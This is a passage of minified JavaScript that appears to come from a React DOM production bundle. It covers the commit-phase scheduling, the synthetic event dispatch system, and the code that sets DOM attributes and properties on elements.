                O.T = null,
                n = B.p,
                B.p = 2,
                c = Te,
                Te |= 4;
                try {
                    Ph(e, t, l)
                } finally {
                    Te = c,
                    B.p = n,
                    O.T = a
                }
            }
            We = 1,
            ld(),
            ad(),
            nd()
        }
    }
    function ld() {
        if (We === 1) {
            We = 0;
            var e = _l
              , t = Va
              , l = (t.flags & 13878) !== 0;
            if ((t.subtreeFlags & 13878) !== 0 || l) {
                l = O.T,
                O.T = null;
                var a = B.p;
                B.p = 2;
                var n = Te;
                Te |= 4;
                try {
                    Lf(t, e);
                    var u = bs
                      , c = Go(e.containerInfo)
                      , r = u.focusedElem
                      , h = u.selectionRange;
                    if (c !== r && r && r.ownerDocument && wo(r.ownerDocument.documentElement, r)) {
                        if (h !== null && Vi(r)) {
                            var T = h.start
                              , M = h.end;
                            if (M === void 0 && (M = T),
                            "selectionStart" in r)
                                r.selectionStart = T,
                                r.selectionEnd = Math.min(M, r.value.length);
                            else {
                                var U = r.ownerDocument || document
                                  , A = U && U.defaultView || window;
                                if (A.getSelection) {
                                    var C = A.getSelection()
                                      , K = r.textContent.length
                                      , P = Math.min(h.start, K)
                                      , Me = h.end === void 0 ? P : Math.min(h.end, K);
                                    !C.extend && P > Me && (c = Me,
                                    Me = P,
                                    P = c);
                                    var b = Yo(r, P)
                                      , y = Yo(r, Me);
                                    if (b && y && (C.rangeCount !== 1 || C.anchorNode !== b.node || C.anchorOffset !== b.offset || C.focusNode !== y.node || C.focusOffset !== y.offset)) {
                                        var E = U.createRange();
                                        E.setStart(b.node, b.offset),
                                        C.removeAllRanges(),
                                        P > Me ? (C.addRange(E),
                                        C.extend(y.node, y.offset)) : (E.setEnd(y.node, y.offset),
                                        C.addRange(E))
                                    }
                                }
                            }
                        }
                        for (U = [],
                        C = r; C = C.parentNode; )
                            C.nodeType === 1 && U.push({
                                element: C,
                                left: C.scrollLeft,
                                top: C.scrollTop
                            });
                        for (typeof r.focus == "function" && r.focus(),
                        r = 0; r < U.length; r++) {
                            var R = U[r];
                            R.element.scrollLeft = R.left,
                            R.element.scrollTop = R.top
                        }
                    }
                    ri = !!Ss,
                    bs = Ss = null
                } finally {
                    Te = n,
                    B.p = a,
                    O.T = l
                }
            }
            e.current = t,
            We = 2
        }
    }
    function ad() {
        if (We === 2) {
            We = 0;
            var e = _l
              , t = Va
              , l = (t.flags & 8772) !== 0;
            if ((t.subtreeFlags & 8772) !== 0 || l) {
                l = O.T,
                O.T = null;
                var a = B.p;
                B.p = 2;
                var n = Te;
                Te |= 4;
                try {
                    Mf(e, t.alternate, t)
                } finally {
                    Te = n,
                    B.p = a,
                    O.T = l
                }
            }
            We = 3
        }
    }
    function nd() {
        if (We === 4 || We === 3) {
            We = 0,
            Wt();
            var e = _l
              , t = Va
              , l = ml
              , a = Zf;
            (t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0 ? We = 5 : (We = 0,
            Va = _l = null,
            ud(e, e.pendingLanes));
            var n = e.pendingLanes;
            if (n === 0 && (Rl = null),
            Ai(l),
            t = t.stateNode,
            St && typeof St.onCommitFiberRoot == "function")
                try {
                    St.onCommitFiberRoot(tn, t, void 0, (t.current.flags & 128) === 128)
                } catch {}
            if (a !== null) {
                t = O.T,
                n = B.p,
                B.p = 2,
                O.T = null;
                try {
                    for (var u = e.onRecoverableError, c = 0; c < a.length; c++) {
                        var r = a[c];
                        u(r.value, {
                            componentStack: r.stack
                        })
                    }
                } finally {
                    O.T = t,
                    B.p = n
                }
            }
            (ml & 3) !== 0 && Iu(),
            Jt(e),
            n = e.pendingLanes,
            (l & 261930) !== 0 && (n & 42) !== 0 ? e === is ? Bn++ : (Bn = 0,
            is = e) : Bn = 0,
            qn(0)
        }
    }
    function ud(e, t) {
        (e.pooledCacheLanes &= t) === 0 && (t = e.pooledCache,
        t != null && (e.pooledCache = null,
        gn(t)))
    }
    function Iu() {
        return ld(),
        ad(),
        nd(),
        id()
    }
    function id() {
        if (We !== 5)
            return !1;
        var e = _l
          , t = ns;
        ns = 0;
        var l = Ai(ml)
          , a = O.T
          , n = B.p;
        try {
            B.p = 32 > l ? 32 : l,
            O.T = null,
            l = us,
            us = null;
            var u = _l
              , c = ml;
            if (We = 0,
            Va = _l = null,
            ml = 0,
            (Te & 6) !== 0)
                throw Error(o(331));
            var r = Te;
            if (Te |= 4,
            Gf(u.current),
            qf(u, u.current, c, l),
            Te = r,
            qn(0, !1),
            St && typeof St.onPostCommitFiberRoot == "function")
                try {
                    St.onPostCommitFiberRoot(tn, u)
                } catch {}
            return !0
        } finally {
            B.p = n,
            O.T = a,
            ud(e, t)
        }
    }
    function cd(e, t, l) {
        t = Mt(l, t),
        t = qc(e.stateNode, t, 2),
        e = Al(e, t, 2),
        e !== null && (an(e, 2),
        Jt(e))
    }
    function De(e, t, l) {
        if (e.tag === 3)
            cd(e, e, l);
        else
            for (; t !== null; ) {
                if (t.tag === 3) {
                    cd(t, e, l);
                    break
                } else if (t.tag === 1) {
                    var a = t.stateNode;
                    if (typeof t.type.getDerivedStateFromError == "function" || typeof a.componentDidCatch == "function" && (Rl === null || !Rl.has(a))) {
                        e = Mt(l, e),
                        l = sf(2),
                        a = Al(t, l, 2),
                        a !== null && (of(l, a, t, e),
                        an(a, 2),
                        Jt(a));
                        break
                    }
                }
                t = t.return
            }
    }
    function os(e, t, l) {
        var a = e.pingCache;
        if (a === null) {
            a = e.pingCache = new lp;
            var n = new Set;
            a.set(t, n)
        } else
            n = a.get(t),
            n === void 0 && (n = new Set,
            a.set(t, n));
        n.has(l) || (ts = !0,
        n.add(l),
        e = cp.bind(null, e, t, l),
        t.then(e, e))
    }
    function cp(e, t, l) {
        var a = e.pingCache;
        a !== null && a.delete(t),
        e.pingedLanes |= e.suspendedLanes & l,
        e.warmLanes &= ~l,
        Ue === e && (ve & l) === l && (Xe === 4 || Xe === 3 && (ve & 62914560) === ve && 300 > Ye() - Ku ? (Te & 2) === 0 && Ka(e, 0) : ls |= l,
        Za === ve && (Za = 0)),
        Jt(e)
    }
    function sd(e, t) {
        t === 0 && (t = eo()),
        e = Wl(e, t),
        e !== null && (an(e, t),
        Jt(e))
    }
    function sp(e) {
        var t = e.memoizedState
          , l = 0;
        t !== null && (l = t.retryLane),
        sd(e, l)
    }
    function op(e, t) {
        var l = 0;
        switch (e.tag) {
        case 31:
        case 13:
            var a = e.stateNode
              , n = e.memoizedState;
            n !== null && (l = n.retryLane);
            break;
        case 19:
            a = e.stateNode;
            break;
        case 22:
            a = e.stateNode._retryCache;
            break;
        default:
            throw Error(o(314))
        }
        a !== null && a.delete(t),
        sd(e, l)
    }
    function rp(e, t) {
        return fe(e, t)
    }
    var Pu = null
      , ka = null
      , rs = !1
      , ei = !1
      , fs = !1
      , Hl = 0;
    function Jt(e) {
        e !== ka && e.next === null && (ka === null ? Pu = ka = e : ka = ka.next = e),
        ei = !0,
        rs || (rs = !0,
        dp())
    }
    function qn(e, t) {
        if (!fs && ei) {
            fs = !0;
            do
                for (var l = !1, a = Pu; a !== null; ) {
                    if (e !== 0) {
                        var n = a.pendingLanes;
                        if (n === 0)
                            var u = 0;
                        else {
                            var c = a.suspendedLanes
                              , r = a.pingedLanes;
                            u = (1 << 31 - bt(42 | e) + 1) - 1,
                            u &= n & ~(c & ~r),
                            u = u & 201326741 ? u & 201326741 | 1 : u ? u | 2 : 0
                        }
                        u !== 0 && (l = !0,
                        dd(a, u))
                    } else
                        u = ve,
                        u = nu(a, a === Ue ? u : 0, a.cancelPendingCommit !== null || a.timeoutHandle !== -1),
                        (u & 3) === 0 || ln(a, u) || (l = !0,
                        dd(a, u));
                    a = a.next
                }
            while (l);
            fs = !1
        }
    }
    function fp() {
        od()
    }
    function od() {
        ei = rs = !1;
        var e = 0;
        Hl !== 0 && Np() && (e = Hl);
        for (var t = Ye(), l = null, a = Pu; a !== null; ) {
            var n = a.next
              , u = rd(a, t);
            u === 0 ? (a.next = null,
            l === null ? Pu = n : l.next = n,
            n === null && (ka = l)) : (l = a,
            (e !== 0 || (u & 3) !== 0) && (ei = !0)),
            a = n
        }
        We !== 0 && We !== 5 || qn(e),
        Hl !== 0 && (Hl = 0)
    }
    function rd(e, t) {
        for (var l = e.suspendedLanes, a = e.pingedLanes, n = e.expirationTimes, u = e.pendingLanes & -62914561; 0 < u; ) {
            var c = 31 - bt(u)
              , r = 1 << c
              , h = n[c];
            h === -1 ? ((r & l) === 0 || (r & a) !== 0) && (n[c] = qm(r, t)) : h <= t && (e.expiredLanes |= r),
            u &= ~r
        }
        if (t = Ue,
        l = ve,
        l = nu(e, e === t ? l : 0, e.cancelPendingCommit !== null || e.timeoutHandle !== -1),
        a = e.callbackNode,
        l === 0 || e === t && (ze === 2 || ze === 9) || e.cancelPendingCommit !== null)
            return a !== null && a !== null && Ee(a),
            e.callbackNode = null,
            e.callbackPriority = 0;
        if ((l & 3) === 0 || ln(e, l)) {
            if (t = l & -l,
            t === e.callbackPriority)
                return t;
            switch (a !== null && Ee(a),
            Ai(l)) {
            case 2:
            case 8:
                l = ma;
                break;
            case 32:
                l = ha;
                break;
            case 268435456:
                l = Ps;
                break;
            default:
                l = ha
            }
            return a = fd.bind(null, e),
            l = fe(l, a),
            e.callbackPriority = t,
            e.callbackNode = l,
            t
        }
        return a !== null && a !== null && Ee(a),
        e.callbackPriority = 2,
        e.callbackNode = null,
        2
    }
    function fd(e, t) {
        if (We !== 0 && We !== 5)
            return e.callbackNode = null,
            e.callbackPriority = 0,
            null;
        var l = e.callbackNode;
        if (Iu() && e.callbackNode !== l)
            return null;
        var a = ve;
        return a = nu(e, e === Ue ? a : 0, e.cancelPendingCommit !== null || e.timeoutHandle !== -1),
        a === 0 ? null : (Kf(e, a, t),
        rd(e, Ye()),
        e.callbackNode != null && e.callbackNode === l ? fd.bind(null, e) : null)
    }
    function dd(e, t) {
        if (Iu())
            return null;
        Kf(e, t, !0)
    }
    function dp() {
        Ep(function() {
            (Te & 6) !== 0 ? fe(ji, fp) : od()
        })
    }
    function ds() {
        if (Hl === 0) {
            var e = _a;
            e === 0 && (e = tu,
            tu <<= 1,
            (tu & 261888) === 0 && (tu = 256)),
            Hl = e
        }
        return Hl
    }
    function md(e) {
        return e == null || typeof e == "symbol" || typeof e == "boolean" ? null : typeof e == "function" ? e : su("" + e)
    }
    function hd(e, t) {
        var l = t.ownerDocument.createElement("input");
        return l.name = t.name,
        l.value = t.value,
        e.id && l.setAttribute("form", e.id),
        t.parentNode.insertBefore(l, t),
        e = new FormData(e),
        l.parentNode.removeChild(l),
        e
    }
    function mp(e, t, l, a, n) {
        if (t === "submit" && l && l.stateNode === n) {
            var u = md((n[ft] || null).action)
              , c = a.submitter;
            c && (t = (t = c[ft] || null) ? md(t.formAction) : c.getAttribute("formAction"),
            t !== null && (u = t,
            c = null));
            var r = new du("action","action",null,a,n);
            e.push({
                event: r,
                listeners: [{
                    instance: null,
                    listener: function() {
                        if (a.defaultPrevented) {
                            if (Hl !== 0) {
                                var h = c ? hd(n, c) : new FormData(n);
                                Rc(l, {
                                    pending: !0,
                                    data: h,
                                    method: n.method,
                                    action: u
                                }, null, h)
                            }
                        } else
                            typeof u == "function" && (r.preventDefault(),
                            h = c ? hd(n, c) : new FormData(n),
                            Rc(l, {
                                pending: !0,
                                data: h,
                                method: n.method,
                                action: u
                            }, u, h))
                    },
                    currentTarget: n
                }]
            })
        }
    }
    for (var ms = 0; ms < $i.length; ms++) {
        var hs = $i[ms]
          , hp = hs.toLowerCase()
          , pp = hs[0].toUpperCase() + hs.slice(1);
        qt(hp, "on" + pp)
    }
    qt(Zo, "onAnimationEnd"),
    qt(Vo, "onAnimationIteration"),
    qt(Ko, "onAnimationStart"),
    qt("dblclick", "onDoubleClick"),
    qt("focusin", "onFocus"),
    qt("focusout", "onBlur"),
    qt(Mh, "onTransitionRun"),
    qt(Rh, "onTransitionStart"),
    qt(_h, "onTransitionCancel"),
    qt(Jo, "onTransitionEnd"),
    Sa("onMouseEnter", ["mouseout", "mouseover"]),
    Sa("onMouseLeave", ["mouseout", "mouseover"]),
    Sa("onPointerEnter", ["pointerout", "pointerover"]),
    Sa("onPointerLeave", ["pointerout", "pointerover"]),
    Kl("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
    Kl("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
    Kl("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
    Kl("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
    Kl("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
    Kl("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
    var Yn = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
      , vp = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Yn));
    function pd(e, t) {
        t = (t & 4) !== 0;
        for (var l = 0; l < e.length; l++) {
            var a = e[l]
              , n = a.event;
            a = a.listeners;
            e: {
                var u = void 0;
                if (t)
                    for (var c = a.length - 1; 0 <= c; c--) {
                        var r = a[c]
                          , h = r.instance
                          , T = r.currentTarget;
                        if (r = r.listener,
                        h !== u && n.isPropagationStopped())
                            break e;
                        u = r,
                        n.currentTarget = T;
                        try {
                            u(n)
                        } catch (M) {
                            pu(M)
                        }
                        n.currentTarget = null,
                        u = h
                    }
                else
                    for (c = 0; c < a.length; c++) {
                        if (r = a[c],
                        h = r.instance,
                        T = r.currentTarget,
                        r = r.listener,
                        h !== u && n.isPropagationStopped())
                            break e;
                        u = r,
                        n.currentTarget = T;
                        try {
                            u(n)
                        } catch (M) {
                            pu(M)
                        }
                        n.currentTarget = null,
                        u = h
                    }
            }
        }
    }
    function me(e, t) {
        var l = t[zi];
        l === void 0 && (l = t[zi] = new Set);
        var a = e + "__bubble";
        l.has(a) || (vd(t, e, 2, !1),
        l.add(a))
    }
    function ps(e, t, l) {
        var a = 0;
        t && (a |= 4),
        vd(l, e, a, t)
    }
    var ti = "_reactListening" + Math.random().toString(36).slice(2);
    function vs(e) {
        if (!e[ti]) {
            e[ti] = !0,
            co.forEach(function(l) {
                l !== "selectionchange" && (vp.has(l) || ps(l, !1, e),
                ps(l, !0, e))
            });
            var t = e.nodeType === 9 ? e : e.ownerDocument;
            t === null || t[ti] || (t[ti] = !0,
            ps("selectionchange", !1, t))
        }
    }
    function vd(e, t, l, a) {
        switch (Vd(t)) {
        case 2:
            var n = Zp;
            break;
        case 8:
            n = Vp;
            break;
        default:
            n = Ms
        }
        l = n.bind(null, t, l, e),
        n = void 0,
        !Li || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (n = !0),
        a ? n !== void 0 ? e.addEventListener(t, l, {
            capture: !0,
            passive: n
        }) : e.addEventListener(t, l, !0) : n !== void 0 ? e.addEventListener(t, l, {
            passive: n
        }) : e.addEventListener(t, l, !1)
    }
    function ys(e, t, l, a, n) {
        var u = a;
        if ((t & 1) === 0 && (t & 2) === 0 && a !== null)
            e: for (; ; ) {
                if (a === null)
                    return;
                var c = a.tag;
                if (c === 3 || c === 4) {
                    var r = a.stateNode.containerInfo;
                    if (r === n)
                        break;
                    if (c === 4)
                        for (c = a.return; c !== null; ) {
                            var h = c.tag;
                            if ((h === 3 || h === 4) && c.stateNode.containerInfo === n)
                                return;
                            c = c.return
                        }
                    for (; r !== null; ) {
                        if (c = va(r),
                        c === null)
                            return;
                        if (h = c.tag,
                        h === 5 || h === 6 || h === 26 || h === 27) {
                            a = u = c;
                            continue e
                        }
                        r = r.parentNode
                    }
                }
                a = a.return
            }
        bo(function() {
            var T = u
              , M = Ui(l)
              , U = [];
            e: {
                var A = ko.get(e);
                if (A !== void 0) {
                    var C = du
                      , K = e;
                    switch (e) {
                    case "keypress":
                        if (ru(l) === 0)
                            break e;
                    case "keydown":
                    case "keyup":
                        C = oh;
                        break;
                    case "focusin":
                        K = "focus",
                        C = wi;
                        break;
                    case "focusout":
                        K = "blur",
                        C = wi;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        C = wi;
                        break;
                    case "click":
                        if (l.button === 2)
                            break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        C = jo;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        C = Fm;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        C = dh;
                        break;
                    case Zo:
                    case Vo:
                    case Ko:
                        C = eh;
                        break;
                    case Jo:
                        C = hh;
                        break;
                    case "scroll":
                    case "scrollend":
                        C = $m;
                        break;
                    case "wheel":
                        C = vh;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        C = lh;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        C = To;
                        break;
                    case "toggle":
                    case "beforetoggle":
                        C = gh
                    }
                    var P = (t & 4) !== 0
                      , Me = !P && (e === "scroll" || e === "scrollend")
                      , b = P ? A !== null ? A + "Capture" : null : A;
                    P = [];
                    for (var y = T, E; y !== null; ) {
                        var R = y;
                        if (E = R.stateNode,
                        R = R.tag,
                        R !== 5 && R !== 26 && R !== 27 || E === null || b === null || (R = cn(y, b),
                        R != null && P.push(wn(y, R, E))),
                        Me)
                            break;
                        y = y.return
                    }
                    0 < P.length && (A = new C(A,K,null,l,M),
                    U.push({
                        event: A,
                        listeners: P
                    }))
                }
            }
            if ((t & 7) === 0) {
                e: {
                    if (A = e === "mouseover" || e === "pointerover",
                    C = e === "mouseout" || e === "pointerout",
                    A && l !== _i && (K = l.relatedTarget || l.fromElement) && (va(K) || K[pa]))
                        break e;
                    if ((C || A) && (A = M.window === M ? M : (A = M.ownerDocument) ? A.defaultView || A.parentWindow : window,
                    C ? (K = l.relatedTarget || l.toElement,
                    C = T,
                    K = K ? va(K) : null,
                    K !== null && (Me = v(K),
                    P = K.tag,
                    K !== Me || P !== 5 && P !== 27 && P !== 6) && (K = null)) : (C = null,
                    K = T),
                    C !== K)) {
                        if (P = jo,
                        R = "onMouseLeave",
                        b = "onMouseEnter",
                        y = "mouse",
                        (e === "pointerout" || e === "pointerover") && (P = To,
                        R = "onPointerLeave",
                        b = "onPointerEnter",
                        y = "pointer"),
                        Me = C == null ? A : un(C),
                        E = K == null ? A : un(K),
                        A = new P(R,y + "leave",C,l,M),
                        A.target = Me,
                        A.relatedTarget = E,
                        R = null,
                        va(M) === T && (P = new P(b,y + "enter",K,l,M),
                        P.target = E,
                        P.relatedTarget = Me,
                        R = P),
                        Me = R,
                        C && K)
                            t: {
                                for (P = yp,
                                b = C,
                                y = K,
                                E = 0,
                                R = b; R; R = P(R))
                                    E++;
                                R = 0;
                                for (var W = y; W; W = P(W))
                                    R++;
                                for (; 0 < E - R; )
                                    b = P(b),
                                    E--;
                                for (; 0 < R - E; )
                                    y = P(y),
                                    R--;
                                for (; E--; ) {
                                    if (b === y || y !== null && b === y.alternate) {
                                        P = b;
                                        break t
                                    }
                                    b = P(b),
                                    y = P(y)
                                }
                                P = null
                            }
                        else
                            P = null;
                        C !== null && yd(U, A, C, P, !1),
                        K !== null && Me !== null && yd(U, Me, K, P, !0)
                    }
                }
                e: {
                    if (A = T ? un(T) : window,
                    C = A.nodeName && A.nodeName.toLowerCase(),
                    C === "select" || C === "input" && A.type === "file")
                        var Ne = _o;
                    else if (Mo(A))
                        if (Uo)
                            Ne = Dh;
                        else {
                            Ne = Ah;
                            var k = Th
                        }
                    else
                        C = A.nodeName,
                        !C || C.toLowerCase() !== "input" || A.type !== "checkbox" && A.type !== "radio" ? T && Ri(T.elementType) && (Ne = _o) : Ne = zh;
                    if (Ne && (Ne = Ne(e, T))) {
                        Ro(U, Ne, l, M);
                        break e
                    }
                    k && k(e, A, T),
                    e === "focusout" && T && A.type === "number" && T.memoizedProps.value != null && Mi(A, "number", A.value)
                }
                switch (k = T ? un(T) : window,
                e) {
                case "focusin":
                    (Mo(k) || k.contentEditable === "true") && (Ta = k,
                    Ki = T,
                    pn = null);
                    break;
                case "focusout":
                    pn = Ki = Ta = null;
                    break;
                case "mousedown":
                    Ji = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Ji = !1,
                    Xo(U, l, M);
                    break;
                case "selectionchange":
                    if (Oh)
                        break;
                case "keydown":
                case "keyup":
                    Xo(U, l, M)
                }
                var oe;
                if (Xi)
                    e: {
                        switch (e) {
                        case "compositionstart":
                            var ye = "onCompositionStart";
                            break e;
                        case "compositionend":
                            ye = "onCompositionEnd";
                            break e;
                        case "compositionupdate":
                            ye = "onCompositionUpdate";
                            break e
                        }
                        ye = void 0
                    }
                else
                    Ea ? Co(e, l) && (ye = "onCompositionEnd") : e === "keydown" && l.keyCode === 229 && (ye = "onCompositionStart");
                ye && (Ao && l.locale !== "ko" && (Ea || ye !== "onCompositionStart" ? ye === "onCompositionEnd" && Ea && (oe = xo()) : (Sl = M,
                Bi = "value" in Sl ? Sl.value : Sl.textContent,
                Ea = !0)),
                k = li(T, ye),
                0 < k.length && (ye = new Eo(ye,e,null,l,M),
                U.push({
                    event: ye,
                    listeners: k
                }),
                oe ? ye.data = oe : (oe = Oo(l),
                oe !== null && (ye.data = oe)))),
                (oe = bh ? xh(e, l) : Nh(e, l)) && (ye = li(T, "onBeforeInput"),
                0 < ye.length && (k = new Eo("onBeforeInput","beforeinput",null,l,M),
                U.push({
                    event: k,
                    listeners: ye
                }),
                k.data = oe)),
                mp(U, e, T, l, M)
            }
            pd(U, t)
        })
    }
    function wn(e, t, l) {
        return {
            instance: e,
            listener: t,
            currentTarget: l
        }
    }
    function li(e, t) {
        for (var l = t + "Capture", a = []; e !== null; ) {
            var n = e
              , u = n.stateNode;
            if (n = n.tag,
            n !== 5 && n !== 26 && n !== 27 || u === null || (n = cn(e, l),
            n != null && a.unshift(wn(e, n, u)),
            n = cn(e, t),
            n != null && a.push(wn(e, n, u))),
            e.tag === 3)
                return a;
            e = e.return
        }
        return []
    }
    function yp(e) {
        if (e === null)
            return null;
        do
            e = e.return;
        while (e && e.tag !== 5 && e.tag !== 27);
        return e || null
    }
    function yd(e, t, l, a, n) {
        for (var u = t._reactName, c = []; l !== null && l !== a; ) {
            var r = l
              , h = r.alternate
              , T = r.stateNode;
            if (r = r.tag,
            h !== null && h === a)
                break;
            r !== 5 && r !== 26 && r !== 27 || T === null || (h = T,
            n ? (T = cn(l, u),
            T != null && c.unshift(wn(l, T, h))) : n || (T = cn(l, u),
            T != null && c.push(wn(l, T, h)))),
            l = l.return
        }
        c.length !== 0 && e.push({
            event: t,
            listeners: c
        })
    }
    var gp = /\r\n?/g
      , Sp = /\u0000|\uFFFD/g;
    function gd(e) {
        return (typeof e == "string" ? e : "" + e).replace(gp, `
`).replace(Sp, "")
    }
    function Sd(e, t) {
        return t = gd(t),
        gd(e) === t
    }
    function Oe(e, t, l, a, n, u) {
        switch (l) {
        case "children":
            typeof a == "string" ? t === "body" || t === "textarea" && a === "" || xa(e, a) : (typeof a == "number" || typeof a == "bigint") && t !== "body" && xa(e, "" + a);
            break;
        case "className":
            iu(e, "class", a);
            break;
        case "tabIndex":
            iu(e, "tabindex", a);
            break;
        case "dir":
        case "role":
        case "viewBox":
        case "width":
        case "height":
            iu(e, l, a);
            break;
        case "style":
            go(e, a, u);
            break;
        case "data":
            if (t !== "object") {
                iu(e, "data", a);
                break
            }
        case "src":
        case "href":
            if (a === "" && (t !== "a" || l !== "href")) {
                e.removeAttribute(l);
                break
            }
            if (a == null || typeof a == "function" || typeof a == "symbol" || typeof a == "boolean") {
                e.removeAttribute(l);
                break
            }
            a = su("" + a),
            e.setAttribute(l, a);
            break;
        case "action":
        case "formAction":
            if (typeof a == "function") {
                e.setAttribute(l, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
                break
            } else
                typeof u == "function" && (l === "formAction" ? (t !== "input" && Oe(e, t, "name", n.name, n, null),
                Oe(e, t, "formEncType", n.formEncType, n, null),
                Oe(e, t, "formMethod", n.formMethod, n, null),
                Oe(e, t, "formTarget", n.formTarget, n, null)) : (Oe(e, t, "encType", n.encType, n, null),
                Oe(e, t, "method", n.method, n, null),
                Oe(e, t, "target", n.target, n, null)));
            if (a == null || typeof a == "symbol" || typeof a == "boolean") {
                e.removeAttribute(l);
                break
            }
            a = su("" + a),
            e.setAttribute(l, a);
            break;
        case "onClick":
            a != null && (e.onclick = It);
            break;
        case "onScroll":
            a != null && me("scroll", e);
            break;
        case "onScrollEnd":
            a != null && me("scrollend", e);
            break;
        case "dangerouslySetInnerHTML":
            if (a != null) {
                if (typeof a != "object" || !("__html" in a))
                    throw Error(o(61));
                if (l = a.__html,
                l != null) {
                    if (n.children != null)
                        throw Error(o(60));
                    e.innerHTML = l
                }
            }
            break;
        case "multiple":
            e.multiple = a && typeof a != "function" && typeof a != "symbol";
            break;
        case "muted":
            e.muted = a && typeof a != "function" && typeof a != "symbol";
            break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "defaultValue":
        case "defaultChecked":
        case "innerHTML":
        case "ref":
            break;
        case "autoFocus":
            break;
        case "xlinkHref":
            if (a == null || typeof a == "function" || typeof a == "boolean" || typeof a == "symbol") {
                e.removeAttribute("xlink:href");
                break
            }
            l = su("" + a),
            e.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", l);
            break;
        case "contentEditable":
        case "spellCheck":
        case "draggable":
        case "value":
        case "autoReverse":
        case "externalResourcesRequired":
        case "focusable":
        case "preserveAlpha":
            a != null && typeof a != "function" && typeof a != "symbol" ? e.setAttribute(l, "" + a) : e.removeAttribute(l);
            break;
        case "inert":
        case "allowFullScreen":
        case "async":
        case "autoPlay":
        case "controls":
        case "default":
        case "defer":
        case "disabled":
        case "disablePictureInPicture":
        case "disableRemotePlayback":
        case "formNoValidate":
        case "hidden":
        case "loop":
        case "noModule":
        case "noValidate":
        case "open":
        case "playsInline":
        case "readOnly":
        case "required":
        case "reversed":
        case "scoped":
        case "seamless":
        case "itemScope":
            a && typeof a != "function" && typeof a != "symbol" ? e.setAttribute(l, "") : e.removeAttribute(l);
            break;
        case "capture":
        case "download":
            a === !0 ? e.setAttribute(l, "") : a !== !1 && a != null && typeof a != "function" && typeof a != "symbol" ? e.setAttribute(l, a) : e.removeAttribute(l);
            break;
        case "cols":
        case "rows":
        case "size":
        case "span":
            a != null && typeof a != "function" && typeof a != "symbol" && !isNaN(a) && 1 <= a ? e.setAttribute(l, a) : e.removeAttribute(l);
            break;
        case "rowSpan":
        case "start":
            a == null || typeof a == "function" || typeof a == "symbol" || isNaN(a) ? e.removeAttribute(l) : e.setAttribute(l, a);
            break;
        case "popover":
            me("beforetoggle", e),
            me("toggle", e),
            uu(e, "popover", a);
            break;
        case "xlinkActuate":
            Ft(e, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
            break;
        case "xlinkArcrole":
            Ft(e, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
            break;
        case "xlinkRole":
            Ft(e, "http://www.w3.org/1999/xlink", "xlink:role", a);
            break;
        case "xlinkShow":
            Ft(e, "http://www.w3.org/1999/xlink", "xlink:show", a);
            break;
        case "xlinkTitle":
            Ft(e, "http://www.w3.org/1999/xlink", "xlink:title", a);
            break;
        case "xlinkType":
            Ft(e, "http://www.w3.org/1999/xlink", "xlink:type", a);
            break;
        case "xmlBase":
            Ft(e, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
            break;
        case "xmlLang":
            Ft(e, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
            break;
        case "xmlSpace":
            Ft(e, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
            break;
        case "is":
            uu(e, "is", a);
            break;
        case "innerText":
        case "textContent":
            break;
        default:
            (!(2 < l.length) || l[0] !== "o" && l[0] !== "O" || l[1] !== "n" && l[1] !== "N") && (l = Jm.get(l) || l,
            uu(e, l, a))
        }
    }
    function gs(e, t, l, a, n, u) {
        switch (l) {
        case "style":
            go(e, a, u);
            break;
        case "dangerouslySetInnerHTML":
            if (a != null) {
                if (typeof a != "object" || !("__html" in a))
                    throw Error(o(61));
                if (l = a.__html,
                l != null) {
                    if (n.children != null)
                        throw Error(o(60));
                    e.innerHTML = l
                }
            }
            break;
        case "children":
            typeof a == "string" ? xa(e, a) : (typeof a == "number" || typeof a == "bigint") && xa(e, "" + a);
            break;
        case "onScroll":
            a != null && me("scroll", e);
            break;
        case "onScrollEnd":
            a != null && me("scrollend", e);
            break;
        case "onClick":
            a != null && (e.onclick = It);
            break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "innerHTML":
        case "ref":
            break;
        case "innerText":
        case "textContent":
            break;
        default:
            if (!so.hasOwnProperty(l))
                e: {
                    if (l[0] === "o" && l[1] === "n" && (n = l.endsWith("Capture"),
                    t = l.slice(2, n ? l.length - 7 : void 0),
                    u = e[ft] || null,
                    u = u != null ? u[l] : null,
                    typeof u == "function" && e.removeEventListener(t, u, n),
                    typeof a == "function")) {
                        typeof u != "function" && u !== null && (l in e ? e[l] = null : e.hasAttribute(l) && e.removeAttribute(l)),
                        e.addEventListener(t, a, n);
                        break e
                    }
